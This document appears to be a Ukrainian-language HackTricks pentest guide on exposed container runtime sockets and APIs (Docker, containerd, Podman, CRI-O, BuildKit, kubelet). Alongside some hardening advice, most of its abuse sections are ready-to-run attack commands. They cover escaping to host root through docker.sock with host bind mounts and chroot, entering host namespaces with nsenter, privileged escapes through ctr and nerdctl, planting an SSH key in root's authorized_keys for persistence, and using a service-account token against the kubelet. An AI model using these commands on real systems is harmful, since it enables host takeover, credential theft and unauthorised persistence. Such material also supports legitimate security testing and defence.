# Відкриття Runtime API та daemon

## Огляд

Багато реальних компрометацій контейнерів узагалі не починаються з escape з namespace. Вони починаються з доступу до control plane runtime. Якщо workload може взаємодіяти з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix socket чи відкритий TCP listener, attacker може отримати можливість запросити новий контейнер із вищими privileges, змонтувати файлову систему host, приєднатися до host namespaces або отримати sensitive information про node. У таких випадках runtime API є справжньою межею безпеки, а його компрометація функціонально майже рівнозначна компрометації host.

Саме тому exposure runtime socket слід документувати окремо від kernel protections. Контейнер зі звичайними seccomp, capabilities і MAC confinement усе ще може бути на відстані одного API call від компрометації host, якщо `/var/run/docker.sock` або `/run/containerd/containerd.sock` змонтовано всередині нього. Kernel isolation поточного контейнера може працювати саме так, як задумано, тоді як management plane runtime залишається повністю відкритим.

## Моделі доступу до daemon

Docker Engine традиційно відкриває свій privileged API через локальний Unix socket `unix:///var/run/docker.sock`. Історично він також відкривався віддалено через TCP listeners, наприклад `tcp://0.0.0.0:2375`, або через TLS-protected listener на `2376`. Відкриття daemon віддалено без strong TLS і client authentication фактично перетворює Docker API на remote root interface.

containerd, CRI-O, Podman і kubelet відкривають подібні high-impact surfaces. Назви та workflows відрізняються, але логіка залишається тією самою. Якщо interface дозволяє caller створювати workloads, монтувати host paths, отримувати credentials або змінювати running containers, цей interface є privileged management channel і має відповідно розглядатися.

Поширені локальні paths, які варто перевірити:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або спеціалізованіші стеки також можуть відкривати такі endpoints, як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони трапляються рідше, але якщо ви з ними зіткнулися, їх слід розглядати з такою самою обережністю, оскільки вони є поверхнями керування runtime, а не звичайними application sockets.

## Безпечний віддалений доступ

Якщо daemon потрібно відкрити за межами локального socket, з'єднання слід захистити за допомогою TLS і, бажано, взаємної автентифікації, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара звичка відкривати Docker daemon через звичайний HTTP заради зручності є однією з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API достатньо потужна, щоб безпосередньо створювати привілейовані контейнери.

Історичний шаблон конфігурації Docker мав такий вигляд:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на базі systemd взаємодія з daemon також може відбуватися через `fd://`, тобто процес успадковує попередньо відкритий socket від systemd, а не прив’язує його безпосередньо самостійно. Важливий висновок полягає не в точному синтаксисі, а в наслідках для безпеки. Щойно daemon починає прослуховувати щось більше, ніж локальний socket із жорстко обмеженими дозволами, безпека транспортного рівня та автентифікація клієнтів стають обов’язковими, а не додатковим hardening.

## Зловживання

Якщо runtime socket присутній, з’ясуйте, який саме це socket, чи існує сумісний client і чи можливий доступ через raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ці команди корисні, оскільки дають змогу відрізнити недоступний шлях, змонтований, але недоступний сокет і робочий привілейований API. Якщо клієнт працює, наступне питання полягає в тому, чи може API запустити новий контейнер із host bind mount або спільним використанням host namespace.

### Коли клієнт не встановлено

Відсутність `docker`, `podman` або іншого зручного CLI не означає, що сокет безпечний. Docker Engine працює через HTTP поверх Unix-сокета, а Podman надає як Docker-сумісний API, так і нативний API Libpod через `podman system service`. Це означає, що мінімального середовища, у якому є лише `curl`, може бути достатньо для керування daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Це має значення під час post-exploitation, оскільки захисники іноді видаляють стандартні клієнтські binaries, але залишають змонтований management socket. На хостах Podman пам’ятайте, що шлях із високою цінністю відрізняється для rootful і rootless deployment: `unix:///run/podman/podman.sock` для rootful service instances і `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless.

### Повний приклад: Docker Socket до root хоста

Якщо `docker.sock` доступний, класичний escape полягає в запуску нового container, який монтує root filesystem хоста, а потім виконує `chroot` у ньому:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує безпосереднє виконання з правами root на хості через Docker daemon. Вплив не обмежується читанням файлів. Опинившись у новому контейнері, attacker може змінювати файли хоста, збирати credentials, встановлювати persistence або запускати додаткові privileged workloads.

### Повний приклад: Docker Socket до Host Namespaces

Якщо attacker надає перевагу входженню в namespace замість доступу лише до файлової системи:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає host, запитуючи runtime створити новий container із явним доступом до host namespaces, а не використовуючи поточний container.

### Docker Socket Persistence Pattern

Керування runtime також можна використовувати для persistence замість одноразового shell. Загальний патерн полягає у створенні helper container із монтуванням host, записі даних авторизованого доступу або startup hook у змонтовану файлову систему host, а потім перевірці, що host їх використовує.

Приблизна структура:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Та сама ідея може бути застосована до systemd units, cron fragments, application startup files або SSH keys — залежно від того, що оператор хоче довести. Важливо те, що persistent change виконується через повноваження runtime daemon щодо файлової системи хоста, а не завдяки додатковим привілеям в оригінальному container.

### Raw Docker API Helper Pivot

Якщо Docker CLI відсутній, той самий host-mount helper flow можна виконати через HTTP поверх Unix socket. Загальний flow такий: підтвердити API, створити helper container із host bind mount, запустити його, створити exec instance і запустити цей exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Фінальний запит `/exec/<id>/start` залежить від отриманого exec ID, але аспект безпеки не залежить від конкретної JSON-реалізації: прямого доступу до API rootful Docker daemon достатньо, щоб запросити потужніше допоміжне workload.

### Повний приклад: сокет containerd

Змонтований сокет `containerd` зазвичай є таким самим небезпечним:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Якщо доступний клієнт, більш схожий на Docker, `nerdctl` може бути зручнішим за `ctr`, оскільки він підтримує знайомі прапорці, як-от `--privileged`, `--pid=host` і `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Впливом знову є компрометація host. Навіть якщо Docker-specific tooling відсутній, інший runtime API все одно може надавати ті самі адміністративні можливості. На Kubernetes nodes `crictl` також може бути достатнім для reconnaissance та взаємодії з containers, оскільки він напряму працює з CRI endpoint.

### BuildKit Socket

`buildkitd` легко не помітити, оскільки його часто вважають «лише build backend», але daemon усе одно є привілейованою control plane. Доступний `buildkitd.sock` може дозволити attacker виконувати довільні build steps, перевіряти worker capabilities, використовувати local contexts із compromised environment і запитувати небезпечні entitlements, такі як `network.host` або `security.insecure`, якщо daemon було налаштовано на їх дозвіл.

Корисні перші взаємодії:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Якщо daemon приймає запити на build, перевірте, чи доступні небезпечні entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Точний вплив залежить від конфігурації daemon, але rootful-сервіс BuildKit із permissive entitlements — це не нешкідлива зручність для розробників. Розглядайте його як ще одну високопріоритетну адміністративну поверхню, особливо на CI runners і спільних build nodes.

### Kubelet API через TCP

kubelet не є container runtime, але він усе одно належить до площини керування node і часто розглядається в межах тієї самої trust boundary. Якщо secure port kubelet `10250` доступний із workload або якщо облікові дані node, kubeconfigs чи proxy rights відкриті, attacker може отримати змогу перелічувати Pods, отримувати logs або виконувати команди в node-local containers, не взаємодіючи безпосередньо з admission path Kubernetes API server.

Почніть із недорогого discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Якщо kubelet або proxy-шлях API-server авторизує `exec`, клієнт із підтримкою WebSocket може перетворити це на виконання коду в інших контейнерах на вузлі. Саме тому `nodes/proxy` лише з дозволом `get` небезпечніший, ніж здається: запит усе одно може досягти кінцевих точок kubelet, які виконують команди, а такі прямі взаємодії з kubelet не відображаються у звичайних журналах аудиту Kubernetes.<sup>[[2]](#references)</sup>

## Перевірки

Мета цих перевірок — з’ясувати, чи може контейнер отримати доступ до будь-якої площини керування, яка мала залишатися за межами межі довіри.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Що тут цікавого:

- Змонтований runtime socket зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP listener на `2375` без TLS слід розглядати як умову для remote compromise.
- Змінні середовища, такі як `DOCKER_HOST`, часто вказують, що workload навмисно спроєктований для взаємодії з host runtime.

## Runtime Defaults

| Runtime / platform | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Локальний Unix socket за замовчуванням | `dockerd` слухає локальний socket, а daemon зазвичай є rootful | монтування `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | Daemonless CLI за замовчуванням | Для звичайного локального використання не потрібен довгоживучий привілейований daemon; API sockets усе одно можуть бути відкриті, коли ввімкнено `podman system service` | відкриття `podman.sock`, широке розгортання service, rootful API use |
| containerd | Локальний привілейований socket | Administrative API відкривається через локальний socket і зазвичай використовується інструментами вищого рівня | монтування `containerd.sock`, широкий доступ через `ctr` або `nerdctl`, відкриття привілейованих namespaces |
| CRI-O | Локальний привілейований socket | CRI endpoint призначений для довірених компонентів, локальних для node | монтування `crio.sock`, відкриття CRI endpoint для недовірених workloads |
| Kubernetes kubelet | Node-local management API | Kubelet не повинен бути широко доступним із Pods; залежно від authn/authz доступ може розкрити стан Pods, credentials і функції виконання | монтування kubelet sockets або certs, слабка kubelet auth, host networking разом із доступним kubelet endpoint |

## References

- [1] [Експлуатація socket containerd, частина 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ризики обходу Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
